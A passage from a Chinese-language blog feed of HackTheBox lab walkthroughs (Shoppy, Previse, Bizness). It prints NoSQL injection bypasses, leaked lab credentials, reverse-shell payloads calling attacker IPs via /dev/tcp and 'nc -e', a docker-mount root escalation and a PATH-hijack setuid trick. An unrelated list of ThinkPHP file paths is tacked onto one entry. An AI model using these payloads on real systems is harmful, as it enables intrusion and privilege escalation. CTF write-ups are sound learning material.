 407.83 ms shoppy.htb (10.10.11.180)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 235.39 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¼€äº†ä¸‰ä¸ªç«¯å£ï¼Œ9093ç«¯å£è®¿é—®åçœ‹èµ·æ¥åƒæ˜¯é…ç½®æ–‡ä»¶ï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼ˆåæ¥çœ‹åˆ«çš„wpè¯´è¿™èƒ½çœ‹å‡ºè¿™å°æœºå™¨æœ‰mattermostæœåŠ¡ï¼‰</p>
<p>æœ‰ä¸ªåŸŸå <code>shoppy.htb</code>ï¼Œæ‰«å­åŸŸåæ‰«åˆ°mattermostï¼Œéƒ½æ·»åŠ åˆ°hostsé‡Œï¼Œmattermostè¿™ä¸ªåŸŸåéœ€è¦è´¦å·å¯†ç ç™»é™†</p>
<p>shoppy.htbè¿™ä¸ªæ‰«ç›®å½•æ‰«åˆ°ç™»é™†å£&#x2F;loginï¼Œç„¶åçœ‹å®˜æ–¹å¯¹è¿™ä¸ªæœºå™¨çš„ä»‹ç»æ˜¯å­˜åœ¨Nosqlæ³¨å…¥</p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><blockquote>
<p>Nosqlæ³¨å…¥ä»‹ç»ä»¥åŠpayload</p>
<p><a class="link"   href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" >https://nullsweep.com/a-nosql-injection-primer-with-mongo/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/9908?time__1311=n4+xnD0DuDRDci730=D/iaRmxjhhIWDRxD5t4+Qx" >https://xz.aliyun.com/t/9908?time__1311=n4%2BxnD0DuDRDci730%3DD%2FiaRmxjhhIWDRxD5t4%2BQx<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo" >https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>æ˜¯é€šè¿‡ä»€ä¹ˆåˆ¤æ–­ä¸ºNosqlæ³¨å…¥çš„å‘¢ï¼Ÿï¼ˆå‚è€ƒæ€è·¯ï¼š<a class="link"   href="https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed" >https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed<i class="fas fa-external-link-alt"></i></a> ï¼‰</p>
<p>loginå‘åŒ…æ˜¯postå‘é€usernameå’Œpasswordä¸¤ä¸ªå‚æ•°ï¼ŒæŒ‰å¾€å¸¸é‚£æ ·æµ‹è¯•å•å¼•å·ï¼Œæ¯æ¬¡éƒ½éœ€ç­‰å¾…å¾ˆä¹…çš„æ—¶é—´ç„¶åè¿”å›504ï¼Œç›´æ¥sqlmapè·‘ä¹Ÿæ— æ•ˆï¼Œå½“æˆ‘ä»¬éšä¾¿è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•æ—¶è¿”å›çš„æ˜¯ï¼Œè¿™è¡¨æ˜è¿™ä¸ªwebåœ¨ä½¿ç”¨è·¯ç”±</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913140659.png" ></p>
<p>æ‰€ä»¥å¯èƒ½æ˜¯åœ¨ä½¿ç”¨Node.jsï¼Œä»–å­˜åœ¨ä½¿ç”¨Nosqlæ³¨å…¥æ¼æ´ç»•è¿‡ç™»é™†é™åˆ¶ï¼Œç»è¿‡å°è¯•ï¼Œå¯ä»¥ä½¿ç”¨<code>admin&#39; || &#39;a&#39;==&#39;a</code>ç»•è¿‡</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141054.png" ></p>
<p>ç™»é™†åè·³è½¬åˆ°&#x2F;adminï¼Œä¸»è¦æ˜¯æœ‰ä¸ªsearchåŠŸèƒ½ç‚¹ï¼Œæ²¡æ‰¾åˆ°åˆ«çš„ç‚¹äº†ï¼Œæœç´¢adminï¼Œç»™äº†ä¸€ä¸ªjsonæ–‡ä»¶ï¼Œé‡Œé¢æœ‰adminå¯†ç çš„å“ˆå¸Œï¼ˆçˆ†ç ´ä¸å‡ºæ¥ï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141517.png" ></p>
<p>ä½†æ˜¯ä¸çŸ¥é“æœ‰æ²¡æœ‰åˆ«çš„ç”¨æˆ·ï¼Œç»§ç»­ä½¿ç”¨Nosqlçš„payload<code>admin&#39; || &#39;a&#39;==&#39;a</code>ï¼Œè¿™æ¬¡å¤šçœ‹åˆ°ä¸€ä¸ªç”¨æˆ·çš„å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141635.png" ></p>
<p>çˆ†ç ´åæ‹¿åˆ°è´¦å·å¯†ç <code>josh:remembermethisway</code>ï¼ŒæˆåŠŸç™»é™†mattermosté‚£ä¸ªåŸŸåçš„ç™»é™†å£ï¼Œåœ¨èŠå¤©çª—å£ä¸­æ‰¾åˆ°jaegerçš„è´¦å·å¯†ç ï¼Œsshç™»é™†æˆåŠŸï¼Œæ‹¿åˆ°user</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141843.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>sudo -lçœ‹åˆ° <code>(deploy) /home/deploy/password-manager</code>,password-manageræ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒstringsæŸ¥çœ‹ï¼Œè²Œä¼¼æ˜¯è¾“å…¥æ­£ç¡®çš„å¯†ç åèƒ½æ‹¿åˆ°deployç›®å½•ä¸‹çš„creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142207.png" ></p>
<p>ä¼ åˆ°æœ¬åœ°ï¼Œidaçœ‹äº†ä¸€ä¸‹ï¼Œå¯†ç å°±åœ¨æºä»£ç é‡Œï¼Œ<code>Sample</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142251.png" ></p>
<p>è¾“å…¥æ­£ç¡®å¯†ç åæ‹¿åˆ°deployçš„å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142327.png" ></p>
<p>ç™»é™†deployè¾“å…¥idï¼Œå‘ç°deployåœ¨dockerç»„é‡Œï¼Œæœ‰ç›¸å…³çš„ææƒæ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy@shoppy:/home/jaeger$ id</span><br><span class="line">uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>dockerææƒå‚è€ƒé“¾æ¥</p>
<p><a class="link"   href="https://www.cnblogs.com/kqdssheng/p/18275541" >https://www.cnblogs.com/kqdssheng/p/18275541<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142636.png" ></p>
<p>æœ‰ä¸ªdockerææƒçš„æ¼æ´ï¼Œå¤§æ¦‚æ€è·¯å°±æ˜¯<strong>åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œè¯¥å®¹å™¨ä¸­æŒ‚è½½äº†æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚åœ¨è¿™ä¸ªå®¹å™¨ä¸­ï¼Œæˆ‘å°†æ˜¯æ ¹ç”¨æˆ·ï¼Œå› æ­¤å¯ä»¥å®Œå…¨è®¿é—®å®¹å™¨ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬å®Œæ•´çš„ä¸»æœºæ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚</strong></p>
<p>â€‹	â€¢	docker run: è¿è¡Œä¸€ä¸ªæ–°çš„ Docker å®¹å™¨ã€‚</p>
<p>â€‹	â€¢	-v &#x2F;:&#x2F;mnt: å°†å®¿ä¸»æœºçš„æ ¹ç›®å½• &#x2F; æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨çš„ &#x2F;mnt ç›®å½•ã€‚è¿™æ ·ï¼Œå®¹å™¨å¯ä»¥é€šè¿‡ &#x2F;mnt è®¿é—®åˆ°å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p>â€‹	â€¢	â€“rm: å®¹å™¨åœ¨é€€å‡ºåä¼šè‡ªåŠ¨åˆ é™¤ï¼Œä¸ä¼šä¿ç•™ä¸´æ—¶æ–‡ä»¶æˆ–å®¹å™¨ã€‚</p>
<p>â€‹	â€¢	-it: ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œå¹¶åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ã€‚è¿™æ ·ä½ å¯ä»¥åœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤å¹¶çœ‹åˆ°è¾“å‡ºã€‚</p>
<p>â€‹	â€¢	alpine: æŒ‡å®šä½¿ç”¨ Alpine Linux è¿™ä¸ªå°å‹çš„ Linux å‘è¡Œç‰ˆé•œåƒä½œä¸ºå®¹å™¨çš„åŸºç¡€é•œåƒã€‚</p>
<p>â€‹	â€¢	chroot &#x2F;mnt: ä½¿ç”¨ chroot å‘½ä»¤å°† &#x2F;mnt ä½œä¸ºæ–°çš„æ ¹ç›®å½•ï¼Œå°†å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿåˆ‡æ¢åˆ°å®¿ä¸»æœºçš„æ ¹ç›®å½•ã€‚</p>
<p>â€‹	â€¢	bash: è¿è¡Œ bashï¼Œç»™ä½ ä¸€ä¸ªæ–°çš„ shell ç¯å¢ƒã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913143024.png" ></p>
<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æˆåŠŸè¯»åˆ°root.txtï¼Œåç»­ä¹Ÿå¯ä»¥é€šè¿‡è¯»å–shadowæˆ–æ˜¯sshç§é’¥ç­‰æ–¹æ³•æ¥è·å¾—çœŸæ­£çš„å®¿ä¸»æœºroot</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶æœºè¿˜æŒºæœ‰æ„æ€çš„ï¼Œä¸»è¦æ¶‰åŠåˆ°Nosqlæ³¨å…¥å’Œdockerææƒï¼Œéƒ½æ˜¯ç¬¬ä¸€æ¬¡é‡è§ï¼Œè¿‡åè¦å¥½å¥½æ¶ˆåŒ–ä¸€ä¸‹è¿™ä¸¤ä¸ªçŸ¥è¯†äº†ã€‚ã€‚</p>
<h5 id="æ¨èé˜…è¯»wp"><a href="#æ¨èé˜…è¯»wp" class="headerlink" title="æ¨èé˜…è¯»wp"></a>æ¨èé˜…è¯»wp</h5><p><a class="link"   href="https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm" >https://0xdf.gitlab.io/2023/01/14/htb-shoppy.htm<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb previseå¤ç›˜</title>
    <url>/2024/09/13/htb-previse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”€# nmap -A -p- --min-rate=1000 -T4 10.10.11.104</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 19:03 PDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=9/12%OT=22%CT=1%CU=42757%PV=Y%DS=2%DC=T%G=Y%TM=66E3</span><br><span class="line">OS:9E0F%P=aarch64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A</span><br><span class="line">OS:)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53A</span><br><span class="line">OS:ST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1</span><br><span class="line">OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O</span><br><span class="line">OS:=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N</span><br><span class="line">OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=</span><br><span class="line">OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF</span><br><span class="line">OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=</span><br><span class="line">OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   414.58 ms 10.10.16.1</span><br><span class="line">2   587.74 ms 10.10.11.104</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 165.33 seconds</span><br></pre></td></tr></table></figure>

<p>åªæœ‰22å’Œ80ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100648.png" ></p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>å…ˆè®¿é—®80ç«¯å£ï¼Œåªæœ‰ä¸€ä¸ªç™»é™†å£ï¼Œå°è¯•äº†å¯†ç çˆ†ç ´å’Œsqlæ³¨å…¥ï¼Œéƒ½ä¸æˆåŠŸï¼Œåé¢çœ‹çš„å®˜æ–¹å¯¹æœºå™¨çš„æè¿°æ˜¯å…³äºé‡å®šå‘çš„ï¼Œæ‰«åˆ°çš„nav.phpï¼Œç‚¹åˆ°å…¶ä»–phpéƒ½ä¼šå®šå‘ä¼šlogin.phpã€‚çœ‹ä¸€ä¸‹bpå†å²åŒ…</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100810.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913100944.png" ></p>
<p>å¯ä»¥çœ‹åˆ°è¿”å›åŒ…é‡Œæœ‰accounts.phpçš„è¯¦ç»†å†…å®¹ï¼Œä½†æ˜¯çŠ¶æ€ç æ˜¯302ï¼Œæˆ‘ä»¬å°è¯•bpæŠ“åŒ…åâ€Do interactâ€ï¼Œä¿®æ”¹è¿”å›åŒ…çš„çŠ¶æ€ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101145.png" ></p>
<p>è¿™ä¸‹å°±ä¸ä¼šè¢«é‡å®šå‘åˆ°login.phpï¼Œå¯ä»¥çœ‹åˆ°æ­£å¸¸çš„accounté¡µé¢</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101238.png" ></p>
<p>æˆ‘ä»¬åœ¨è¿™é‡Œæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œå†æ­£å¸¸ç™»é™†ï¼Œç™»é™†åå°±ä¸ä¼šè¢«é‡å®šå‘äº†</p>
<p>ç„¶åå†download.phpæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ä¸‹è½½çš„å‹ç¼©åŒ…<code>SITEBACKUP.zip</code>ï¼Œä¸‹è½½ä¸‹æ¥æ˜¯ç½‘ç«™çš„æºç ï¼Œconfig.phpå¯ä»¥çœ‹åˆ°mysqlç™»é™†è´¦å·å¯†ç ï¼Œåé¢å¯ä»¥ç”¨ï¼Œç»è¿‡ä¸€ç•ªæœå¯»ï¼Œåœ¨logs.phpé‡Œé¢å‘ç°<code>exec</code>å‡½æ•°ï¼Œé‡Œé¢çš„å˜é‡å¯æ§ï¼Œå¤§æ¦‚ç‡å­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913101933.png" ></p>
<p>æ‰¾åˆ°å¯¼å‡ºlogçš„phpï¼ŒæŠ“åˆ°åŒ…</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913102148.png" ></p>
<p>æ”¹å˜ä¸€ä¸‹delimå˜é‡å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delim=%3bbash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/10.10.16.4/1234+0&gt;%261&#x27;%3b</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸåå¼¹shell</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>æ‹¿åˆ°ç¬¬ä¸€ååº”æ˜¯å…ˆç™»é™†mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -u root -p&#x27;mySQL_p@ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">&lt;ssw0rd!:)&#x27; -e &#x27;use previse;select * from accounts;&#x27;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">id      username        password        created_at</span><br><span class="line">1       m4lwhere        $1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36</span><br><span class="line">2       admin   $1$ğŸ§‚llol$G3KunFyMrVvsqYP1JpRi70        2024-09-13 02:06:23</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ° <code>m4lwhere</code>çš„åŠ ç›å¯†ç ï¼Œè¿˜è¦çœ‹åˆ°ä»–æ˜¯ä»€ä¹ˆç±»å‹çš„å“ˆå¸Œ</p>
<p>ç„¶ååœ¨accounts.phpæºç æ‰¾åˆ°å­˜å‚¨é€»è¾‘</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913103416.png" ></p>
<p>Crypt()å‡½æ•°ï¼Œmd5åŠ å¯†æ¥çš„ï¼Œäºæ˜¯æŒ‡å®šjohnçš„çˆ†ç ´æ ¼å¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>

<p>æœ€åæ‹¿åˆ°å¯†ç <code>ilovecody112235!</code>ç™»é™†m4lwhere</p>
<p>ç¬¬ä¸€ä»¶äº‹sudo -lï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ç”¨çš„è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">ls</span> -l /opt/scripts/access_backup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ <span class="built_in">cat</span> /opt/scripts/access_backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="built_in">date</span> --<span class="built_in">date</span>=<span class="string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰ä¿®æ”¹æƒé™ï¼Œç¬¬ä¸€ååº”æ˜¯ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œé‡Œé¢ç”¨åˆ°gzip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">&#x27;#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash&#x27;</span> &gt; gzip</span><br><span class="line"><span class="built_in">chmod</span> +x gzip</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /opt/scripts/access_backup.sh</span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913104313.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>çœŸæ„Ÿè§‰htbè´¨é‡é«˜ï¼Œéš¾åº¦é€‚ä¸­ï¼Œä»€ä¹ˆçŸ¥è¯†ç‚¹éƒ½éœ€è¦ï¼Œæœ€å¼€å§‹é‡å®šå‘åˆ†æé‚£ä¸ªç®—æ˜¯åŸºç¡€ï¼Œè¿™æ¬¡å¤ç›˜ä¸‹æ¥ä¹Ÿæ˜¯åŠ æ·±äº†å°è±¡ï¼Œæ‹¿åˆ°æºç åå®¡è®¡è¿™å—çœŸéœ€è¦è€å¿ƒã€‚ã€‚ã€‚</p>
<p>\server\index.php<br>\server\simplewind\Core\ThinkPHP.php<br>\server\simplewind\Core\Library\Think\Think.class.php<br>\server\simplewind\Core\Library\Think\Storage.class.php<br>\server\simplewind\Core\Library\Think\Storage\Driver\File.class.php<br>\server\simplewind\Core\Mode\common.php<br>\server\simplewind\Core\Common\functions.php<br>\server\application\Common\Common\function.php<br>\server\simplewind\Core\Library\Think\Hook.class.php<br>\server\simplewind\Core\Library\Think\App.class.php<br>\server\simplewind\Core\Library\Think\Dispatcher.class.php<br>\server\simplewind\Core\Library\Think\Route.class.php<br>\server\simplewind\Core\Library\Think\Controller.class.php<br>\server\simplewind\Core\Library\Think\View.class.php<br>\server\simplewind\Core\Library\Behavior\BuildLiteBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ParseTemplateBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ContentReplaceBehavior.class.php<br>\server\simplewind\Core\Conf\convention.php<br>\server\application\Common\Conf\config.php<br>\server\data\conf\db.php<br>\server\data\conf\config.php<br>\server\data\conf\route.php<br>\server\application\Common\Conf\alias.php<br>\server\application\Common\Conf\tags.php<br>\server\simplewind\Core\Lang\zh-cn.php<br>\server\simplewind\Core\Conf\debug.php<br>\server\application\Common\Conf\debug.php<br>\server\application\Common\Behavior\InitHookBehavior.class.php<br>\server\simplewind\Core\Library\Think\Behavior.class.php<br>\server\simplewind\Core\Library\Think\Cache.class.php<br>\server\simplewind\Core\Library\Think\Cache\Driver\File.class.php<br>\server\application\Common\Common\extend.php<br>\server\application\Portal\Conf\config.php<br>\server\application\Portal\Common\function.php<br>\server\simplewind\Core\Library\Behavior\ReadHtmlCacheBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\CheckLangBehavior.class.php<br>\server\application\Common\Lang\zh-cn.php<br>\server\application\Portal\Controller\IndexController.class.php<br>\server\application\Common\Controller\HomebaseController.class.php<br>\server\application\Common\Controller\AppframeController.class.php<br>\server\simplewind\Core\Library\Think\Template.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib\Cx.class.php<br>\server\simplewind\Core\Library\Think\Template\TagLib.class.php<br>\server\application\Common\Lib\Taglib\TagLibSpadmin.class.php<br>\server\application\Common\Lib\Taglib\TagLibHome.class.php<br>\server\application\Portal\Lib\Taglib\Portal.class.php<br>\server\data\runtime\Cache\Portal\5c2fc9f3dd331fb0470c86f0c6552505.php<br>\server\simplewind\Core\Library\Think\Model.class.php<br>\server\simplewind\Core\Library\Think\Db.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver\Mysql.class.php<br>\server\simplewind\Core\Library\Think\Db\Driver.class.php<br>\server\simplewind\Lib\Util\Tree.class.php<br>\server\simplewind\Core\Library\Behavior\WriteHtmlCacheBehavior.class.php<br>\server\application\Common\Behavior\TmplStripSpaceBehavior.class.php<br>\server\simplewind\Core\Library\Behavior\ShowPageTraceBehavior.class.php</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb biznesså¤ç›˜</title>
    <url>/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šeasy</p>
<p>IPï¼š10.10.11.252</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>ç«¯å£æ‰«æï¼Œæ‰«åˆ°22 80 443 40081ç«¯å£ï¼Œå…ˆçœ‹80ç«¯å£ï¼Œéœ€è¦é…ç½®hostsæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®ç½‘é¡µï¼Œç¿»åˆ°æœ€ä¸‹é¢å‘ç°æ˜¯apache ofbiz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
<p>æŸ¥è¯¢åˆ°æœ‰ç›¸å…³æ¼æ´ï¼Œååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2023-49070ï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°<a class="link"   href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>ï¼ŒæŒ‰ç…§pocä½¿ç”¨</p>
<p>å…ˆä¸‹è½½ysoserial.jarç”Ÿæˆbase64çš„payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘åŒ…</p>
